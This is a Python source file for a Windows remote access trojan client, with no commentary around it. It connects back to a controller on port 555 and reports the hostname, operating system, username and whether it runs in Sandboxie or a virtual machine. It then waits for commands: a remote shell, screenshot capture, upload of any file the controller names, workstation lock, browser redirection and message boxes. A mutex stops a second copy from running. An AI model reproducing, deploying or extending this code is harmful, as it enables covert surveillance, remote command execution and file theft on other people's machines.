import socket
import os
import sys
import platform
import time
import ctypes
import subprocess
import threading
import wmi
import win32
import win32api
import winerror
import win32event
import win32crypt
from winreg import *
import webbrowser
import pyscreeze

host = '127.0.0.1'
port = 555
path = os.path.relpath(sys.argv[0])
TMP = os.environ["APPDATA"]
BUFFER = 4096
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALIAS_EXISTS:
    mutex = None
    sys.exit(0)


def detect_sandboxie():
    try:
        lib_handle = ctypes.windll.LoadLibrary("SbieDll.dll")
        return "(Sandboxie) "
    except:
        return ""


def detectVM():
    WMI = wmi.WMI()
    for disk_drive in WMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in disk_drive.Caption.lower() or "virtual" in disk_drive.Caption.lower():
            return " (virtual machine)"
        return ""


def message_box(msg):
    vbs = open(TMP + '/m.vbs', 'w')
    vbs.write(r"msgbox \"" + msg + " " + r"\\Message")
    vbs.close()
    subprocess.Popen(['cscript', TMP + '/m.vbs'], shell=True)


def server_connect():
    global client
    while True:
        try:
            client = socket.socket()
            client.connect((host, port))
        except socket.error:
            time.sleep(5)
        else:
            break
    str_user_info = socket.gethostbyname(
        host) + "'," + platform.system() + " " + platform.release() + detect_sandboxie() + detectVM() + "'," + \
                    os.environ["USERNAME"]
    client.send(str.encode(str_user_info))

def send_file(path):
    if os.path.exists(path)==False:
        client.send("the file does not exist".encode())
    client.send(path.split("\\")[-1].encode())
    client.send(str(os.path.getsize(path)).encode())
    size=os.path.getsize(path)
    buffer=0
    with open(path,'rb')as f:
        while size>buffer:
            data=f.read(BUFFER)
            client.send(data)
            buffer+=len(data)
def screenshot():
    pyscreeze.screenshot(TMP + "\s.png")
    client.send(("receiving screenshot\nFile size: " + str(
        os.path.getsize(TMP + "/s.png")) + " bytes\nPlease wait...").encode())
    picture = open(TMP + "/s.png", 'rb')
    time.sleep(1)
    client.send(picture.read())
    picture.close()


def lock():
    ctypes.windll.user32.LockWorkStation()


def command_shell():
    current_dir = os.getcwd()
    client.send(current_dir.encode())
    while True:
        data = client.recv(BUFFER).decode()
        if data == "goback":
            os.chdir(current_dir)
            break
        elif data[:2].lower() == 'cd' or data[:5] == 'chdir':
            command = subprocess.Popen(data + ' & cd', stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE, shell=True)
            if command.stderr.read().decode()=="":
                output = command.stdout.read().decode().splitlines()[0]
                os.chdir(output)
                byte_data = f"\n{os.getcwd()}>"
        elif len(data) > 0:
            command = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                       shell=True)
            output = (command.stdout.read()+command.stderr.read()).decode(errors="replace")
            byte_data = output+f"\n{os.getcwd()}>"
        else:
            byte_data = 'Error !!!'
        client.send(str(len(byte_data.encode())).encode())
        time.sleep(0.1)
        client.send(byte_data.encode())


server_connect()
while True:
    try:
        data = client.recv(BUFFER).decode()
        if data == 'exit':
            client.close()
            sys.exit(0)
        elif data[:3] == 'msg':
            message_box(data[4:])
        elif data[:4] == 'site':
            webbrowser.get().open(data[4:])
        elif data == "screen":
            screenshot()
        elif data == 'lock':
            lock()
        elif data == "cmd":
            command_shell()
        elif data[:4]=='site':
            webbrowser.get().open(data[4:])
        elif data=="download":
            path=client.recv(BUFFER).decode()
            send_file(path)
    except socket.error():
        client.close()
        del client
        server_connect()
